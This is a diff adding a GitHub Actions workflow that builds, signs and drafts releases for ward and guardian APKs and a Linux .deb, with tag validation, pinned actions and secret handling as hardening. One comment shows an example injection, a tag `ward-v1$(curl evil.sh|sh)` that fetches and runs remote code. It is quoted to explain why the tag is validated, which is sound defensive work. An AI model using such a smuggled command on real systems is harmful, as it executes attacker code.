@@ -1,0 +1,504 @@
+name: Release artifacts
+
+# Tag-triggered build + sign pipeline. It NEVER publishes anything on its
+# own: every run lands a DRAFT GitHub Release (never marked latest) carrying
+# the artifact, a SHA256SUMS file and a build-provenance attestation. A human
+# then reviews the draft and runs, LOCALLY:
+#
+#   node scripts/release/publish-release.mjs --from-draft <tag>
+#
+# which re-verifies the draft end-to-end (sha256, attestation, and — for
+# APKs — the signing-cert digest) before mirroring to Blossom, signing the
+# Nostr release event, and publishing the draft. See docs/releasing.md.
+#
+# One tag prefix per artifact (must match scripts/release/release-helpers.mjs
+# GITHUB_NAMING exactly):
+#   ward-v<version>      -> the ward APK      (android/app)
+#   guardian-v<version>  -> the carrier APK   (android/carrier)
+#   linux-v<version>     -> the .deb          (linux/, via xtask)
+
+on:
+  push:
+    tags:
+      - 'ward-v*'
+      - 'guardian-v*'
+      - 'linux-v*'
+  workflow_dispatch:
+    inputs:
+      tag:
+        description: 'Tag to (re)build, e.g. ward-v0.6.13 (must already exist)'
+        type: string
+        required: true
+
+# One in-flight build per tag; a re-run queues rather than races or cancels
+# a signing job that may be sitting on the `release` environment's approval.
+concurrency:
+  group: release-artifacts-${{ github.event.inputs.tag || github.ref_name }}
+  cancel-in-progress: false
+
+permissions: {}
+
+jobs:
+  # ---------------------------------------------------------------------
+  # Which artifact does this tag name, and does the tag's version agree
+  # with the source it is supposed to describe? A mismatch is refused here,
+  # before anything is built or signed.
+  # ---------------------------------------------------------------------
+  resolve:
+    name: Resolve tag -> artifact + version
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    outputs:
+      tag: ${{ steps.validate.outputs.tag }}
+      channel: ${{ steps.parse.outputs.channel }}
+      version: ${{ steps.parse.outputs.version }}
+    steps:
+      # Validate BEFORE anything else runs a shell over this value. The tag
+      # comes from a workflow_dispatch input or a ref name — both can be
+      # anything a caller with tag-push rights types — so it is never
+      # interpolated into a `run:` script directly (that is exactly how a
+      # tag like `ward-v1$(curl evil.sh|sh)` becomes a command). It only
+      # ever reaches a script as this step's OWN output, after being
+      # checked against a strict allowlist regex.
+      - name: Validate the tag
+        id: validate
+        env:
+          TAG: ${{ github.event.inputs.tag || github.ref_name }}
+        run: |
+          set -euo pipefail
+          # Keep textually identical to CI_RELEASE_TAG_RE in
+          # scripts/release/release-helpers.mjs (tested there; there is no
+          # import across YAML and JS to enforce this automatically).
+          if ! [[ "$TAG" =~ ^(ward|guardian|linux)-v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+            echo "::error::tag '$TAG' does not match ^(ward|guardian|linux)-v<major>.<minor>.<patch>\$"
+            exit 1
+          fi
+          echo "tag=$TAG" >> "$GITHUB_OUTPUT"
+
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          ref: refs/tags/${{ steps.validate.outputs.tag }}
+          persist-credentials: false
+
+      - name: Parse the tag and check it against the source version
+        id: parse
+        env:
+          TAG: ${{ steps.validate.outputs.tag }}
+        run: |
+          set -euo pipefail
+          case "$TAG" in
+            ward-v*)
+              CHANNEL=charter-apk
+              VERSION=${TAG#ward-v}
+              SOURCE=$(grep -oE 'versionName = "[^"]+"' android/app/build.gradle.kts | sed 's/.*"\(.*\)"/\1/')
+              WHERE="android/app/build.gradle.kts versionName"
+              ;;
+            guardian-v*)
+              CHANNEL=mycharter-apk
+              VERSION=${TAG#guardian-v}
+              SOURCE=$(grep -oE 'versionName = "[^"]+"' android/carrier/build.gradle.kts | sed 's/.*"\(.*\)"/\1/')
+              WHERE="android/carrier/build.gradle.kts versionName"
+              ;;
+            linux-v*)
+              CHANNEL=charter-deb
+              VERSION=${TAG#linux-v}
+              SOURCE=$(grep -m1 -oE '^version = "[^"]+"' linux/Cargo.toml | sed 's/.*"\(.*\)"/\1/')
+              WHERE="linux/Cargo.toml version"
+              ;;
+            *)
+              echo "::error::tag '$TAG' matches none of ward-v*, guardian-v*, linux-v*"
+              exit 1
+              ;;
+          esac
+          if [ -z "$SOURCE" ]; then
+            echo "::error::could not read a version from $WHERE"
+            exit 1
+          fi
+          if [ "$SOURCE" != "$VERSION" ]; then
+            echo "::error::tag $TAG names version $VERSION but $WHERE is $SOURCE — bump the source and re-tag"
+            exit 1
+          fi
+          echo "tag=$TAG" >> "$GITHUB_OUTPUT"
+          echo "channel=$CHANNEL" >> "$GITHUB_OUTPUT"
+          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
+
+  # ---------------------------------------------------------------------
+  # Ward APK (android/app). Runs in the `release` Environment so the
+  # sysadmin's required-reviewer gate applies before the keystore secrets
+  # are ever exposed to a runner.
+  # ---------------------------------------------------------------------
+  build-ward-apk:
+    name: Build + sign ward APK
+    needs: resolve
+    if: needs.resolve.outputs.channel == 'charter-apk'
+    runs-on: ubuntu-latest
+    environment: release
+    permissions:
+      contents: read
+    outputs:
+      apk_path: ${{ steps.build.outputs.apk_path }}
+      version_code: ${{ steps.build.outputs.version_code }}
+      cert: ${{ steps.build.outputs.cert }}
+      sha256: ${{ steps.build.outputs.sha256 }}
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          ref: refs/tags/${{ needs.resolve.outputs.tag }}
+          persist-credentials: false
+
+      # The build script itself never falls back to the debug key, but this
+      # catches the bridge being set as a CI secret/variable by mistake — CI
+      # must never sign a release with it.
+      - name: Refuse the debug-signing bridge in CI
+        env:
+          ALPHA_BRIDGE_SECRET: ${{ secrets.CHARTER_ALPHA_DEBUG_SIGNING }}
+          ALPHA_BRIDGE_VAR: ${{ vars.CHARTER_ALPHA_DEBUG_SIGNING }}
+        run: |
+          if [ -n "$ALPHA_BRIDGE_SECRET" ] || [ -n "$ALPHA_BRIDGE_VAR" ]; then
+            echo "::error::CHARTER_ALPHA_DEBUG_SIGNING must never be set in CI (see android/keystore/README.md)"
+            exit 1
+          fi
+
+      - uses: actions/setup-java@b6effb05e454b25005698d916606bdc6ffcbf961 # v5.0.0
+        with:
+          distribution: temurin
+          java-version: '21'
+
+      - name: Install the pinned Android SDK platform, build-tools and NDK
+        run: |
+          set -euo pipefail
+          SDKMANAGER="$ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager"
+          yes | "$SDKMANAGER" --licenses > /dev/null
+          "$SDKMANAGER" --install "platforms;android-36" "build-tools;36.0.0" "ndk;29.0.14206865" > /dev/null
+          echo "ANDROID_NDK_HOME=$ANDROID_HOME/ndk/29.0.14206865" >> "$GITHUB_ENV"
+
+      # android/jni is its own standalone Cargo workspace (see its Cargo.toml)
+      # with no rust-toolchain.toml of its own; it path-deps into core/, so it
+      # is built with core's pinned channel + Android targets for the same
+      # reason core/rust-toolchain.toml pins them.
+      - name: Install the pinned Rust toolchain + Android targets
+        run: |
+          set -euo pipefail
+          CHANNEL=$(grep -m1 '^channel' core/rust-toolchain.toml | sed -E 's/.*"(.*)".*/\1/')
+          rustup toolchain install "$CHANNEL" --profile minimal
+          rustup target add aarch64-linux-android x86_64-linux-android --toolchain "$CHANNEL"
+          rustup default "$CHANNEL"
+
+      # Pinned to the version verified on the maintainer's laptop (`cargo ndk
+      # --version`) — a signing job must never pull whatever the latest
+      # cargo-ndk happens to be on the day it runs.
+      - name: Install cargo-ndk
+        run: cargo install cargo-ndk --version 4.1.2 --locked
+
+      - name: Decode the release keystore
+        env:
+          CHARTER_KEYSTORE_B64: ${{ secrets.CHARTER_KEYSTORE_B64 }}
+        run: |
+          set -euo pipefail
+          [ -n "$CHARTER_KEYSTORE_B64" ] || { echo "::error::CHARTER_KEYSTORE_B64 is not set on the release environment"; exit 1; }
+          KEYSTORE_PATH="$RUNNER_TEMP/release.keystore"
+          echo "$CHARTER_KEYSTORE_B64" | base64 -d > "$KEYSTORE_PATH"
+          echo "CHARTER_KEYSTORE_FILE=$KEYSTORE_PATH" >> "$GITHUB_ENV"
+
+      # MANDATORY (rotation plan, 2026-09-27, C5): every fielded ward/guardian
+      # is still signed with the debug cert, so a release-key APK with no
+      # rotation lineage installs on NO device — it would pass every
+      # on-device gate and fail only at the install commit. lib.sh's
+      # android_sign_rotated refuses to build without this too; failing here
+      # first avoids burning a full build for a misconfigured environment.
+      - name: Decode the signing-lineage file
+        env:
+          CHARTER_SIGNING_LINEAGE_B64: ${{ secrets.CHARTER_SIGNING_LINEAGE_B64 }}
+        run: |
+          set -euo pipefail
+          [ -n "$CHARTER_SIGNING_LINEAGE_B64" ] || { echo "::error::CHARTER_SIGNING_LINEAGE_B64 is not set on the release environment — mandatory alongside CHARTER_KEYSTORE_B64 (see docs/releasing.md)"; exit 1; }
+          LINEAGE_PATH="$RUNNER_TEMP/rotation.lineage"
+          echo "$CHARTER_SIGNING_LINEAGE_B64" | base64 -d > "$LINEAGE_PATH"
+          echo "CHARTER_SIGNING_LINEAGE_FILE=$LINEAGE_PATH" >> "$GITHUB_ENV"
+
+      - name: Build + sign the ward APK
+        id: build
+        env:
+          CHARTER_KEYSTORE_PASSWORD: ${{ secrets.CHARTER_KEYSTORE_PASSWORD }}
+          CHARTER_KEY_ALIAS: ${{ secrets.CHARTER_KEY_ALIAS }}
+          CHARTER_KEY_PASSWORD: ${{ secrets.CHARTER_KEY_PASSWORD }}
+        run: |
+          set -euo pipefail
+          BUILD_VARS=$(android/scripts/build-apk.sh)
+          # shellcheck disable=SC1090
+          . "$BUILD_VARS"
+          rm -f "$BUILD_VARS"
+          echo "apk_path=android/$APK" >> "$GITHUB_OUTPUT"
+          echo "version_name=$VN" >> "$GITHUB_OUTPUT"
+          echo "version_code=$VC" >> "$GITHUB_OUTPUT"
+          echo "cert=$CERT" >> "$GITHUB_OUTPUT"
+          echo "sha256=$SHA" >> "$GITHUB_OUTPUT"
+
+      - name: Remove the decoded keystore and lineage file
+        if: always()
+        run: rm -f "$RUNNER_TEMP/release.keystore" "$RUNNER_TEMP/rotation.lineage"
+
+      - uses: actions/upload-artifact@330a01c490aca151604b8cf639adc76d48f6c5d4 # v5.0.0
+        with:
+          name: ward-apk
+          path: ${{ steps.build.outputs.apk_path }}
+          if-no-files-found: error
+          retention-days: 14
+
+  # ---------------------------------------------------------------------
+  # Guardian ("carrier") APK (android/carrier). Same environment and
+  # toolchain as the ward APK, plus the bundled console assets (D1).
+  # ---------------------------------------------------------------------
+  build-guardian-apk:
+    name: Build + sign guardian APK
+    needs: resolve
+    if: needs.resolve.outputs.channel == 'mycharter-apk'
+    runs-on: ubuntu-latest
+    environment: release
+    permissions:
+      contents: read
+    outputs:
+      apk_path: ${{ steps.build.outputs.apk_path }}
+      version_code: ${{ steps.build.outputs.version_code }}
+      cert: ${{ steps.build.outputs.cert }}
+      sha256: ${{ steps.build.outputs.sha256 }}
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          ref: refs/tags/${{ needs.resolve.outputs.tag }}
+          persist-credentials: false
+
+      - name: Refuse the debug-signing bridge in CI
+        env:
+          ALPHA_BRIDGE_SECRET: ${{ secrets.CHARTER_ALPHA_DEBUG_SIGNING }}
+          ALPHA_BRIDGE_VAR: ${{ vars.CHARTER_ALPHA_DEBUG_SIGNING }}
+        run: |
+          if [ -n "$ALPHA_BRIDGE_SECRET" ] || [ -n "$ALPHA_BRIDGE_VAR" ]; then
+            echo "::error::CHARTER_ALPHA_DEBUG_SIGNING must never be set in CI (see android/keystore/README.md)"
+            exit 1
+          fi
+
+      - uses: actions/setup-java@b6effb05e454b25005698d916606bdc6ffcbf961 # v5.0.0
+        with:
+          distribution: temurin
+          java-version: '21'
+
+      # No cache: false (or any cache restore) — this job decodes the
+      # release keystore below, and a shared actions cache is writable by
+      # any workflow run in the repo. Restoring one here would let a
+      # poisoned cache entry execute inside a job that holds signing
+      # secrets. `npm ci` from a committed lockfile is fast enough uncached.
+      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
+        with:
+          node-version: 24
+
+      - name: Install the console's dependencies (bundled into this APK, D1)
+        working-directory: apps/charter-app
+        run: npm ci
+
+      - name: Install the pinned Android SDK platform, build-tools and NDK
+        run: |
+          set -euo pipefail
+          SDKMANAGER="$ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager"
+          yes | "$SDKMANAGER" --licenses > /dev/null
+          "$SDKMANAGER" --install "platforms;android-36" "build-tools;36.0.0" "ndk;29.0.14206865" > /dev/null
+          echo "ANDROID_NDK_HOME=$ANDROID_HOME/ndk/29.0.14206865" >> "$GITHUB_ENV"
+
+      - name: Install the pinned Rust toolchain + Android targets
+        run: |
+          set -euo pipefail
+          CHANNEL=$(grep -m1 '^channel' core/rust-toolchain.toml | sed -E 's/.*"(.*)".*/\1/')
+          rustup toolchain install "$CHANNEL" --profile minimal
+          rustup target add aarch64-linux-android x86_64-linux-android --toolchain "$CHANNEL"
+          rustup default "$CHANNEL"
+
+      # Pinned to the version verified on the maintainer's laptop (`cargo ndk
+      # --version`) — a signing job must never pull whatever the latest
+      # cargo-ndk happens to be on the day it runs.
+      - name: Install cargo-ndk
+        run: cargo install cargo-ndk --version 4.1.2 --locked
+
+      - name: Decode the release keystore
+        env:
+          CHARTER_KEYSTORE_B64: ${{ secrets.CHARTER_KEYSTORE_B64 }}
+        run: |
+          set -euo pipefail
+          [ -n "$CHARTER_KEYSTORE_B64" ] || { echo "::error::CHARTER_KEYSTORE_B64 is not set on the release environment"; exit 1; }
+          KEYSTORE_PATH="$RUNNER_TEMP/release.keystore"
+          echo "$CHARTER_KEYSTORE_B64" | base64 -d > "$KEYSTORE_PATH"
+          echo "CHARTER_KEYSTORE_FILE=$KEYSTORE_PATH" >> "$GITHUB_ENV"
+
+      # MANDATORY (rotation plan, 2026-09-27, C5) — see the ward job above.
+      - name: Decode the signing-lineage file
+        env:
+          CHARTER_SIGNING_LINEAGE_B64: ${{ secrets.CHARTER_SIGNING_LINEAGE_B64 }}
+        run: |
+          set -euo pipefail
+          [ -n "$CHARTER_SIGNING_LINEAGE_B64" ] || { echo "::error::CHARTER_SIGNING_LINEAGE_B64 is not set on the release environment — mandatory alongside CHARTER_KEYSTORE_B64 (see docs/releasing.md)"; exit 1; }
+          LINEAGE_PATH="$RUNNER_TEMP/rotation.lineage"
+          echo "$CHARTER_SIGNING_LINEAGE_B64" | base64 -d > "$LINEAGE_PATH"
+          echo "CHARTER_SIGNING_LINEAGE_FILE=$LINEAGE_PATH" >> "$GITHUB_ENV"
+
+      - name: Build + sign the guardian APK
+        id: build
+        env:
+          CHARTER_KEYSTORE_PASSWORD: ${{ secrets.CHARTER_KEYSTORE_PASSWORD }}
+          CHARTER_KEY_ALIAS: ${{ secrets.CHARTER_KEY_ALIAS }}
+          CHARTER_KEY_PASSWORD: ${{ secrets.CHARTER_KEY_PASSWORD }}
+        run: |
+          set -euo pipefail
+          BUILD_VARS=$(android/scripts/build-carrier-apk.sh)
+          # shellcheck disable=SC1090
+          . "$BUILD_VARS"
+          rm -f "$BUILD_VARS"
+          echo "apk_path=android/$APK" >> "$GITHUB_OUTPUT"
+          echo "version_name=$VN" >> "$GITHUB_OUTPUT"
+          echo "version_code=$VC" >> "$GITHUB_OUTPUT"
+          echo "cert=$CERT" >> "$GITHUB_OUTPUT"
+          echo "sha256=$SHA" >> "$GITHUB_OUTPUT"
+
+      - name: Remove the decoded keystore and lineage file
+        if: always()
+        run: rm -f "$RUNNER_TEMP/release.keystore" "$RUNNER_TEMP/rotation.lineage"
+
+      - uses: actions/upload-artifact@330a01c490aca151604b8cf639adc76d48f6c5d4 # v5.0.0
+        with:
+          name: guardian-apk
+          path: ${{ steps.build.outputs.apk_path }}
+          if-no-files-found: error
+          retention-days: 14
+
+  # ---------------------------------------------------------------------
+  # Linux .deb (linux/, via xtask). No signing secrets, but it still lands
+  # a release artifact, so it sits behind the same `release` Environment's
+  # required-reviewer gate as the APK jobs — an unattended build must never
+  # produce something a maintainer can go on to publish.
+  # ---------------------------------------------------------------------
+  build-linux-deb:
+    name: Build the Linux .deb (xtask)
+    needs: resolve
+    if: needs.resolve.outputs.channel == 'charter-deb'
+    runs-on: ubuntu-24.04
+    environment: release
+    permissions:
+      contents: read
+    outputs:
+      deb_path: ${{ steps.build.outputs.deb_path }}
+      sha256: ${{ steps.build.outputs.sha256 }}
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          ref: refs/tags/${{ needs.resolve.outputs.tag }}
+          persist-credentials: false
+
+      # xtask also builds apps/charter-console (wry/tao), which needs the
+      # WebKitGTK/GTK dev toolchain the headless core/linux CI gates
+      # deliberately avoid (rust.yml). Standard GTK-webview build deps.
+      - name: Install the WebKitGTK/GTK toolchain for charter-console
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y --no-install-recommends \
+            build-essential pkg-config libssl-dev \
+            libwebkit2gtk-4.1-dev libjavascriptcoregtk-4.1-dev libsoup-3.0-dev \
+            libgtk-3-dev libayatana-appindicator3-dev librsvg2-dev
+
+      - name: Install the pinned Rust toolchain (linux/rust-toolchain.toml)
+        working-directory: linux
+        run: rustup show
+
+      - uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6 # v2.9.2
+        with:
+          workspaces: linux
+
+      - name: Build the .deb
+        id: build
+        working-directory: linux
+        run: |
+          set -euo pipefail
+          cargo run -q -p xtask -- deb
+          DEB=$(ls target/deb/*.deb)
+          SHA=$(sha256sum "$DEB" | cut -d' ' -f1)
+          echo "deb_path=linux/$DEB" >> "$GITHUB_OUTPUT"
+          echo "sha256=$SHA" >> "$GITHUB_OUTPUT"
+
+      - uses: actions/upload-artifact@330a01c490aca151604b8cf639adc76d48f6c5d4 # v5.0.0
+        with:
+          name: linux-deb
+          path: ${{ steps.build.outputs.deb_path }}
+          if-no-files-found: error
+          retention-days: 14
+
+  # ---------------------------------------------------------------------
+  # Land the DRAFT release. Never published, never marked latest — that is
+  # a local, human step (docs/releasing.md).
+  # ---------------------------------------------------------------------
+  publish-draft:
+    name: Draft the GitHub Release
+    needs: [resolve, build-ward-apk, build-guardian-apk, build-linux-deb]
+    if: |
+      always() &&
+      needs.resolve.result == 'success' &&
+      (needs.build-ward-apk.result == 'success' ||
+       needs.build-guardian-apk.result == 'success' ||
+       needs.build-linux-deb.result == 'success')
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      id-token: write
+      attestations: write
+    env:
+      TAG: ${{ needs.resolve.outputs.tag }}
+    steps:
+      - name: Download the built artifact
+        uses: actions/download-artifact@018cc2cf5baa6db3ef3c5f8a56943fffe632ef53 # v6.0.0
+        with:
+          name: ${{ (needs.resolve.outputs.channel == 'charter-apk' && 'ward-apk') || (needs.resolve.outputs.channel == 'mycharter-apk' && 'guardian-apk') || 'linux-deb' }}
+          path: dist
+
+      - name: Compute SHA256SUMS
+        id: sums
+        run: |
+          set -euo pipefail
+          cd dist
+          ARTIFACT=$(ls .)
+          sha256sum "$ARTIFACT" > SHA256SUMS
+          cat SHA256SUMS
+          echo "artifact=$ARTIFACT" >> "$GITHUB_OUTPUT"
+
+      # Sigstore/GitHub-attested provenance for the artifact — the "which CI
+      # run, which commit, which workflow" proof `--from-draft` checks with
+      # `gh attestation verify` before anything downstream trusts the bytes.
+      - uses: actions/attest-build-provenance@43d14bc2b83dec42d39ecae14e916627a18bb661 # v3.0.0
+        with:
+          subject-path: dist/${{ steps.sums.outputs.artifact }}
+
+      - name: Create or update the DRAFT release (never published, never latest)
+        env:
+          GH_TOKEN: ${{ github.token }}
+          REPO: ${{ github.repository }}
+          SHA: ${{ github.sha }}
+        run: |
+          set -euo pipefail
+          if gh release view "$TAG" --repo "$REPO" >/dev/null 2>&1; then
+            IS_DRAFT=$(gh release view "$TAG" --repo "$REPO" --json isDraft -q .isDraft)
+            if [ "$IS_DRAFT" != "true" ]; then
+              echo "::error::$TAG is already a PUBLISHED release — refusing to overwrite it from CI"
+              exit 1
+            fi
+            # No --clobber: an existing asset on this draft is never
+            # replaced (review fix #8). A re-run that finds one already
+            # there means this tag was already built — a genuine rebuild
+            # needs a new tag/version, not a silent overwrite of bytes a
+            # reviewer may already be looking at.
+            EXISTING=$(gh release view "$TAG" --repo "$REPO" --json assets -q '.assets | length')
+            if [ "$EXISTING" != "0" ]; then
+              echo "::error::draft $TAG already has $EXISTING asset(s) — refusing to replace them. Bump the version and re-tag for a rebuild."
+              exit 1
+            fi
+            gh release upload "$TAG" dist/* --repo "$REPO"
+          else
+            gh release create "$TAG" dist/* --repo "$REPO" \
+              --draft --title "$TAG" \
+              --notes "Draft built by CI from $SHA. Do not publish from the GitHub UI: verify and publish with \`node scripts/release/publish-release.mjs --from-draft $TAG\` (see docs/releasing.md)."
+          fi
